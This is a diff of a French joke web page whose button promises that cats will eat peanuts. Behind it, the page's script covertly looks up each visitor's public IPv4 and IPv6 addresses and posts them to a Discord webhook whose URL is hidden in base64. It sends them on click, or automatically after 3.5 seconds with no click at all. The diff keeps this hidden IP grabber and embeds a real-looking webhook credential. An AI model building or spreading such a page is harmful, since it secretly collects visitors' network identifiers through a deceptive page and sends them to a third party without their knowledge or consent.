@@ -9,9 +9,9 @@
             background:linear-gradient(-45deg,#ff9a9e,#fad0c4,#a18cd1,#fbc2eb);background-size:400% 400%;
             animation:g 15s ease infinite;display:flex;flex-direction:column;align-items:center;justify-content:center;color:white;}
         @keyframes g{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
-        h1{font-size:6vw;font-weight:900;background:rgba(255,255,255,0.15);padding:60px 100px;border-radius:50px;backdrop-filter:blur(15px);}
+        h1{font-size:6vw;font-weight:900;background:rgba(255,255,255,.15);padding:60px 100px;border-radius:50px;backdrop-filter:blur(15px);}
         .btn{margin-top:30px;padding:16px 40px;background:rgba(255,255,255,.25);border:none;border-radius:50px;
-            color:white;font-size:19px bold;cursor:pointer;backdrop-filter:blur(10px);
+            color:white;font-size:19px;font-weight:bold;cursor:pointer;backdrop-filter:blur(10px);
             box-shadow:0 8px 25px rgba(0,0,0,.3);transition:.3s;}
         .btn:hover{transform:scale(1.08);}
         @media(max-width:768px){h1{font-size:11vw;padding:40px 60px;}}
@@ -22,20 +22,18 @@
 <button id="btn" class="btn">Clique ici et les chats vont manger des cacahuètes</button>
 
 <script>
-const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4OTQwNDAwNjk3NzYxMC95enVaOVppTHRtQzhVQzZQSFR0TnEtU2VqSHlJQ2NfWHgxMWN3VzhoNlRHaUQ3dVdrN2NyV3NhWEtXX1RFeWQwSHJvag=="; // ← remplace par ton nouveau
+// METS TON NOUVEAU WEBHOOK EN BASE64 ICI (et c’est tout)
+const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4OTQwNDAwNjk3NzYxMC95enVaOVppTHRtQzhVQzZQSFR0TnEtU2VqSHlJQ2NfWHgxMWN3VzhoNlRHaUQ3dVdrN2NyV3NhWEtXX1RFeWQwSHJvag==";
 
-let alreadySent = false; // bloque les doublons
-
-document.onmousemove = document.ontouchstart = () => {
-    if (!alreadySent) alreadySent = true;
-};
+let sent = false; // verrou magique
 
 async function getIPs() {
     let ipv4 = "inconnue", ipv6 = "non détectée";
     try {
         const r = await fetch("https://api64.ipify.org?format=json");
         const d = await r.json();
-        if (d.ip?.includes(":")) ipv6 = d.ip; else ipv4 = d.ip || "inconnue";
+        if (d.ip?.includes(":")) ipv6 = d.ip;
+        else ipv4 = d.ip || "inconnue";
     } catch {}
     if (ipv4 === "inconnue") {
         try { ipv4 = await (await fetch("https://api.ipify.org")).text(); } catch {}
@@ -43,9 +41,9 @@ async function getIPs() {
     return { ipv4, ipv6 };
 }
 
-async function send() {
-    if (alreadySent) return; // ← plus qu’une seule fois
-    alreadySent = true;
+async function sendOnce() {
+    if (sent) return;        // ← si déjà envoyé → on sort direct
+    sent = true;             // ← on verrouille pour toujours
 
     const { ipv4, ipv6 } = await getIPs();
     const url = atob(webhookB64);
@@ -58,8 +56,8 @@ async function send() {
                 title: "Nouveau chat nourri de cacahuètes",
                 color: 16749880,
                 fields: [
-                    { name: "IPv4", value: ipv4, inline: true },
-                    { name: "IPv6", value: ipv6, inline: true },
+                    { name: "IPv4",  value: ipv4, inline: true },
+                    { name: "IPv6",  value: ipv6, inline: true },
                     { name: "Heure", value: new Date().toLocaleString("fr-FR") }
                 ],
                 image: { url: "https://i.redd.it/289ch4osfyie1.jpeg" },
@@ -69,9 +67,9 @@ async function send() {
     });
 }
 
-// Clic → envoi immédiat + disparition
+// Clic = envoi + disparition bouton
 document.getElementById("btn").onclick = () => {
-    send();
+    sendOnce();
     const b = document.getElementById("btn");
     b.style.transition = "all .6s";
     b.style.transform = "scale(0)";
@@ -80,7 +78,7 @@ document.getElementById("btn").onclick = () => {
 };
 
 // Sinon envoi auto après 3,5 s
-setTimeout(send, 3500);
+setTimeout(sendOnce, 3500);
 </script>
 </body>
 </html>
